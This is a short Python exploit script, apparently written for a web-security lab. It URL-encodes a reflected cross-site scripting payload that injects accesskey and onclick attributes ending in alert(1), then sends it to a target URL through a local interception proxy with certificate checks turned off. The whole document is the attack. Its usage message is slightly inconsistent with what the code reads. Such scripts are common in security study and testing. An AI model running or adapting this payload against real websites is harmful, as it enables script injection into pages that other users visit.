import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_xss(s,url):
    payload = "'accesskey='X'onclick='alert(1)"
    payload_encode = urllib.parse.quote(payload)
    r = s.get(url+payload_encode,verify=False,proxies=proxies)
    print(url+payload_encode)


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s css alert' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    exploit_xss(s,url)